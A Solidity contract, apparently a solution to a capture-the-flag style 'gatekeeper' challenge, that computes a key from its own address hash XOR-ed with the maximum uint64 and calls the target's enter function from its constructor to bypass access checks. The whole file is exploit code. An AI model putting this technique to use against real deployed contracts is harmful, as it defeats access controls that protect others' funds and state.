// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    constructor(address _gateKeeper) {
        GateKeeper gateKeeper = GateKeeper(_gateKeeper);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64)).max);
        gateKeeper.enter(key);
    }
}

interface GateKeeper {
   function enter(bytes8) external returns(bool);
}
